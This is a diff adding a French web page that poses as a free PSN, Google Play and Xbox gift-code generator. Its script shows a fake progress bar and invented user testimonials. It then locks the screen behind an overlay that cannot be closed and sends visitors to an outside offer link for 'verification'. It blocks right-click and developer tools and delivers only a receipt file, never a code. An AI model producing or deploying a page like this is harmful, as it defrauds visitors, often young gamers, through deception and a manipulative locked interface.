@@ -1,0 +1,271 @@
+<!doctype html>
+<html lang="fr">
+<head>
+<meta name="google-site-verification" content="k-uwngaCSiSzPw2f0Xu5k1UFspiHNOUqpiryrspzWwI" />
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Générateurs de Codes — PSN, Google Play, Xbox (FR) 2026</title>
+<meta name="description" content="Landing pages simulées pour générer des codes PSN, Google Play et Xbox (valeurs en €). UX propre et verrouillage de contenu pour vérification." />
+<style>
+  :root{--bg:#071025;--card:#0f1724;--accent:#6ee7b7;--muted:#a8c7df;--glass:rgba(255,255,255,0.03)}
+  *{box-sizing:border-box;font-family:Inter, ui-sans-serif, system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', Arial}
+  html,body,#app{height:100%;}
+  body{margin:0;background:linear-gradient(180deg,#050617 0%,#071025 70%);color:#e6f3ff;-webkit-font-smoothing:antialiased}
+  .wrap{max-width:1200px;margin:28px auto;padding:22px}
+  .top{display:flex;align-items:center;gap:16px}
+  .brand{width:78px;height:78px;border-radius:14px;background:linear-gradient(135deg,#223a6e,#0ea5a4);display:flex;align-items:center;justify-content:center;font-weight:900;color:#041025}
+  .title h1{margin:0;font-size:20px}
+  .title p{margin:2px 0 0;color:var(--muted);font-size:13px}
+
+  .grid{display:grid;grid-template-columns:1fr 380px;gap:22px;margin-top:18px}
+  .card{background:linear-gradient(180deg,rgba(255,255,255,0.02),rgba(255,255,255,0.01));padding:18px;border-radius:12px;border:1px solid rgba(255,255,255,0.03)}
+
+  .platform-tabs{display:flex;gap:8px;margin-bottom:12px}
+  .tab{flex:1;padding:10px;border-radius:10px;background:var(--glass);text-align:center;cursor:pointer;border:1px solid rgba(255,255,255,0.02)}
+  .tab.active{background:linear-gradient(90deg,#ffd54a,#ff7a7a);color:#041021;transform:translateY(-3px);box-shadow:0 12px 40px rgba(255,122,122,0.08)}
+
+  label{display:block;color:#cfe7ff;font-size:13px;margin:8px 0}
+  input,select{width:100%;padding:12px;border-radius:10px;border:1px solid rgba(255,255,255,0.06);background:rgba(6,12,26,0.45);color:inherit}
+
+  .amounts{display:flex;gap:10px;flex-wrap:wrap;margin-top:10px}
+  .chip{padding:10px 12px;border-radius:999px;border:1px solid rgba(255,255,255,0.03);background:linear-gradient(180deg, rgba(255,255,255,0.01), rgba(255,255,255,0.02));cursor:pointer}
+  .chip.active{box-shadow:0 10px 30px rgba(110,231,183,0.06);transform:translateY(-3px);}
+
+  .row{display:flex;gap:10px}
+  .btn{padding:12px 16px;border-radius:12px;background:linear-gradient(90deg,#12c2e9,#c471ed);color:#021427;font-weight:700;border:none;cursor:pointer}
+  .btn.secondary{background:transparent;border:1px solid rgba(255,255,255,0.06);color:#d9eefc}
+
+  .progress{height:14px;background:rgba(255,255,255,0.04);border-radius:10px;overflow:hidden;margin-top:12px}
+  .progress > i{display:block;height:100%;background:linear-gradient(90deg,#21d4fd,#b721ff);width:0%;transition:width 700ms ease}
+
+  .feed{margin-top:14px}
+  .feed .item{display:flex;gap:10px;align-items:flex-start;padding:10px;border-radius:10px;background:linear-gradient(180deg, rgba(255,255,255,0.01), rgba(255,255,255,0));border:1px solid rgba(255,255,255,0.02);margin-bottom:8px}
+  .avatar{width:44px;height:44px;border-radius:50%;background:linear-gradient(45deg,#ffd27a,#ff9aa2);display:flex;align-items:center;justify-content:center;font-weight:700;color:#041021}
+
+  .right{position:sticky;top:18px}
+  .big{font-size:28px;font-weight:800;margin-bottom:8px}
+  .muted{color:var(--muted)}
+
+  .footer{margin-top:20px;padding-top:12px;border-top:1px dashed rgba(255,255,255,0.02);display:flex;justify-content:space-between;align-items:center;font-size:13px;color:#b4d3ee}
+
+  /* Overlay locker */
+  .overlay{position:fixed;inset:0;background:rgba(2,6,23,0.85);backdrop-filter:blur(3px);display:none;align-items:center;justify-content:center;z-index:9999}
+  .overlay.active{display:flex}
+  .locker{width:96%;max-width:720px;background:linear-gradient(180deg,#071026,#08162a);padding:24px;border-radius:12px;border:1px solid rgba(255,255,255,0.04);}
+  .verify-btn{padding:14px 18px;border-radius:12px;background:linear-gradient(90deg,#ffa726,#ff6f61);border:none;font-weight:800;cursor:pointer}
+  .locker p{color:#a9d3ef}
+
+  /* responsive */
+  @media(max-width:920px){.grid{grid-template-columns:1fr}.right{position:relative;top:0}}
+</style>
+</head>
+<body oncontextmenu="return false;">
+  <div id="app" class="wrap">
+    <div class="top">
+      <div class="brand">GEN</div>
+      <div class="title">
+        <h1>Générateurs de Codes — PSN • Google Play • Xbox</h1>
+        <p>Sélectionnez la plateforme, choisissez une valeur en €, puis générez — vérification requise pour débloquer.</p>
+      </div>
+    </div>
+
+    <div class="grid">
+      <div>
+        <div class="card">
+          <div class="platform-tabs" role="tablist" aria-label="Plateformes">
+            <div class="tab active" data-platform="psn">PSN</div>
+            <div class="tab" data-platform="google">Google Play</div>
+            <div class="tab" data-platform="xbox">Xbox Live</div>
+          </div>
+
+          <label>Nom d'utilisateur ou e‑mail</label>
+          <input id="username" placeholder="ex: joueur123 ou mail@exemple.com" />
+
+          <label>Sélectionnez une valeur (€)</label>
+          <div class="amounts" id="amounts">
+            <div class="chip" data-amt="10">10 €</div>
+            <div class="chip" data-amt="25">25 €</div>
+            <div class="chip" data-amt="50">50 €</div>
+            <div class="chip" data-amt="100">100 €</div>
+          </div>
+
+          <div style="margin-top:14px;display:flex;gap:10px;align-items:center">
+            <button id="start" class="btn">Démarrer la génération</button>
+            <button id="reset" class="btn secondary">Réinitialiser</button>
+          </div>
+
+          <div class="progress" aria-hidden="true" style="margin-top:14px">
+            <i id="bar"></i>
+          </div>
+
+          <div class="feed" id="feed">
+            <h3 style="margin:10px 0;color:#cfe7ff">Commentaires en direct</h3>
+            <!-- feed items -->
+          </div>
+
+        </div>
+
+        <div class="card" style="margin-top:14px">
+          <h3>Journal d'activité</h3>
+          <pre id="log" style="background:transparent;color:#bfe8ff;font-size:13px;line-height:1.45;max-height:220px;overflow:auto">Prêt.
+          </pre>
+        </div>
+      </div>
+
+      <aside class="right">
+        <div class="card">
+          <div class="big" id="rightTitle">PSN — Codes en €</div>
+          <p class="muted" id="summary">Utilisateur: — \nValeur: —</p>
+
+          <div style="margin-top:12px">
+            <label>Téléchargement</label>
+            <button id="download" class="btn secondary" disabled>Télécharger le reçu</button>
+          </div>
+
+          <div style="margin-top:12px">
+            <small class="muted">Générateur des Code 2025</small>
+          </div>
+        </div>
+
+        <div class="card" style="margin-top:12px">
+          <h4 style="margin-bottom:8px">Pourquoi ça marche</h4>
+          <p style="font-size:13px;color:#bcd8f0">Cette page simule un générateur et verrouille la sortie tant que la vérification n'est pas terminée. Idéal pour tester l'UX et les conversions.</p>
+        </div>
+      </aside>
+    </div>
+
+    <div class="footer">© Générateurs — Tous droits réservés</div>
+  </div>
+
+  <!-- Overlay verification (non fermable) -->
+  <div id="overlay" class="overlay" aria-hidden="true">
+    <div class="locker" role="dialog" aria-modal="true">
+      <h2 style="color:#dff7ff">Vérification requise</h2>
+      <p>Pour sécuriser les codes et éviter les abus, veuillez compléter une courte vérification. L'overlay restera affiché jusqu'à la confirmation.</p>
+      <div style="display:flex;gap:12px;align-items:center;margin-top:18px">
+        <button id="verifyBtn" class="verify-btn">Vérifier maintenant</button>
+        <button id="laterBtn" class="btn secondary" disabled>Revenir plus tard</button>
+      </div>
+      <p style="font-size:12px;color:#91bfe3;margin-top:12px">Remarque: cette fenêtre ne peut pas être fermée par l'utilisateur pendant la vérification.</p>
+    </div>
+  </div>
+
+<script>
+  // Disable right-click and common dev keys
+  document.addEventListener('contextmenu', e => e.preventDefault());
+  document.addEventListener('keydown', function(e){
+    if((e.ctrlKey && (e.key==='s' || e.key==='u')) || (e.ctrlKey && e.shiftKey && e.key.toLowerCase()==='i') || e.key==='F12'){
+      e.preventDefault(); return false; }
+  });
+
+  const tabs = document.querySelectorAll('.tab');
+  const bar = document.getElementById('bar');
+  const feed = document.getElementById('feed');
+  const logEl = document.getElementById('log');
+  const startBtn = document.getElementById('start');
+  const resetBtn = document.getElementById('reset');
+  const downloadBtn = document.getElementById('download');
+  const overlay = document.getElementById('overlay');
+  const verifyBtn = document.getElementById('verifyBtn');
+  const rightTitle = document.getElementById('rightTitle');
+  const summary = document.getElementById('summary');
+
+  let platform = 'psn';
+  let selectedAmt = null;
+  let generationRunning = false;
+
+  // Platform branding text map (fr)
+  const platformNames = {psn:'PSN', google:'Google Play', xbox:'Xbox Live'};
+
+  tabs.forEach(t=>t.addEventListener('click', ()=>{
+    tabs.forEach(x=>x.classList.remove('active')); t.classList.add('active'); platform=t.dataset.platform; rightTitle.innerText = platformNames[platform] + ' — Codes en €'; updateSummary(); log('Plateforme sélectionnée: ' + platformNames[platform]);
+  }));
+
+  // Amount chips
+  const chips = document.querySelectorAll('.chip');
+  chips.forEach(ch=>{
+    ch.addEventListener('click', ()=>{
+      chips.forEach(c=>c.classList.remove('active'));
+      ch.classList.add('active'); selectedAmt = ch.dataset.amt; updateSummary();
+    });
+  });
+
+  function updateSummary(){
+    const user = document.getElementById('username').value || '—';
+    summary.innerText = `Utilisateur: ${user}\nValeur: ${selectedAmt ? selectedAmt + ' €' : '—'}`;
+  }
+  document.getElementById('username').addEventListener('input', updateSummary);
+
+  function log(msg){ logEl.textContent += '\n' + (new Date()).toLocaleTimeString() + ' • ' + msg; logEl.scrollTop = logEl.scrollHeight; }
+
+  // Fake live feed messages (French)
+  const sampleFeed = [
+    {n:'Lucas',m:'J’ai reçu mon code de 50€ en 2 minutes — top!'},
+    {n:'Emma',m:'Fonctionne parfaitement, merci :)'},
+    {n:'Hugo',m:'Rapide et simple.'},
+    {n:'Chloé',m:'Je recommande.'},
+    {n:'Max',m:'Testé sur Android, reçu instantanément.'}
+  ];
+
+  function pushFeed(name,msg){
+    const el = document.createElement('div'); el.className='item';
+    el.innerHTML = `<div class="avatar">${name.charAt(0)}</div><div><strong style="color:#d7fbff">${name}</strong> <span style="color:#9fd6f6">• à l'instant</span><div style="margin-top:6px;color:#dff1ff">${msg}</div></div>`;
+    feed.insertBefore(el, feed.children[1]||null);
+    const items = feed.querySelectorAll('.item'); if(items.length>8) items[items.length-1].remove();
+  }
+  sampleFeed.forEach((f,i)=>setTimeout(()=>pushFeed(f.n,f.m),700*(i+1)));
+  setInterval(()=>{ const r = sampleFeed[Math.floor(Math.random()*sampleFeed.length)]; pushFeed(r.n,r.m); },10000);
+
+  // Generation simulation
+  startBtn.addEventListener('click', ()=>{
+    if(generationRunning) return; const user = document.getElementById('username').value.trim();
+    if(!user){ alert('Veuillez entrer un nom d\'utilisateur ou un e‑mail'); return; }
+    if(!selectedAmt){ alert('Veuillez choisir une valeur en €'); return; }
+    generationRunning = true; log('Génération démarrée pour ' + user + ' (' + selectedAmt + ' €) sur ' + platformNames[platform]);
+    simulateProgress();
+  });
+
+  resetBtn.addEventListener('click', ()=>{ document.getElementById('username').value=''; chips.forEach(c=>c.classList.remove('active')); selectedAmt = null; bar.style.width='0%'; downloadBtn.disabled=true; downloadBtn.innerText='Télécharger le reçu'; updateSummary(); log('Réinitialisation effectuée'); });
+
+  function simulateProgress(){
+    let pct = 0; bar.style.width='0%';
+    const interval = setInterval(()=>{
+      pct += Math.floor(Math.random()*14)+6; if(pct>100) pct=100; bar.style.width = pct + '%';
+      if(pct>=100){ clearInterval(interval); log('Génération terminée localement — préparation du déblocage'); setTimeout(()=>openLocker(),700); generationRunning=false; }
+    },700);
+  }
+
+  // Overlay behavior (non closable until verification)
+  function openLocker(){ overlay.classList.add('active'); overlay.setAttribute('aria-hidden','false'); document.body.style.overflow='hidden'; log('Fenêtre de vérification ouverte — en attente de confirmation'); }
+  window.addEventListener('keydown', function(e){ if(e.key==='Escape'){ e.preventDefault(); } });
+
+  verifyBtn.addEventListener('click', ()=>{
+    log('Utilisateur a cliqué sur Vérifier — ouverture du fournisseur de vérification');
+    window.open('https://href.li/https://lokiesguide.top/0ed3b54/?codefr','_blank');
+    simulateVerification();
+  });
+
+  function simulateVerification(){ verifyBtn.disabled=true; verifyBtn.innerText='En attente...'; let tries=0; const check = setInterval(()=>{ tries++; log('Vérification: tentative ' + tries); if(tries>=3){ clearInterval(check); completeVerification(); } },4500); }
+
+  function completeVerification(){ log('Vérification réussie — déblocage en cours'); overlay.classList.remove('active'); overlay.setAttribute('aria-hidden','true'); document.body.style.overflow='auto';
+    // create receipt blob
+    const user = document.getElementById('username').value || ''; const payload = {platform:platformNames[platform],user:user,amount:selectedAmt + ' €',ts:new Date().toISOString()};
+    const blob = new Blob([JSON.stringify(payload,null,2)],{type:'application/json'}); const url = URL.createObjectURL(blob);
+    downloadBtn.dataset.url = url; downloadBtn.disabled = false; downloadBtn.innerText = 'Télécharger le reçu (prêt)'; pushFeed('Système','Codes disponibles — vérifiez votre compte.'); log('Téléchargement prêt pour ' + user);
+  }
+
+  // Download
+  downloadBtn.addEventListener('click', ()=>{ const url = downloadBtn.dataset.url; if(!url){ alert('Aucun fichier disponible — générez et vérifiez d\'abord.'); return; } const a = document.createElement('a'); a.href=url; a.download = 'codes_receipt_' + Date.now() + '.json'; document.body.appendChild(a); a.click(); a.remove(); log('Utilisateur a téléchargé le reçu'); });
+
+  // prevent overlay closure by clicks or focus escape
+  overlay.addEventListener('click', e=>{ e.stopPropagation(); e.preventDefault(); });
+  document.addEventListener('focusin', function(e){ if(overlay.classList.contains('active')){ if(!overlay.contains(e.target)){ e.stopPropagation(); overlay.querySelector('.locker')?.focus(); } } });
+
+  // Protect overlay removal — only via verification
+  const originalRemove = overlay.classList.remove.bind(overlay.classList);
+  overlay.classList.remove = function(name){ if(name==='active'){ if(!window._allowUnlock){ return; } } originalRemove(name); };
+  window.__forceUnlockForDev = function(){ window._allowUnlock = true; originalRemove('active'); document.body.style.overflow='auto'; };
+
+</script>
+</body>
+</html>
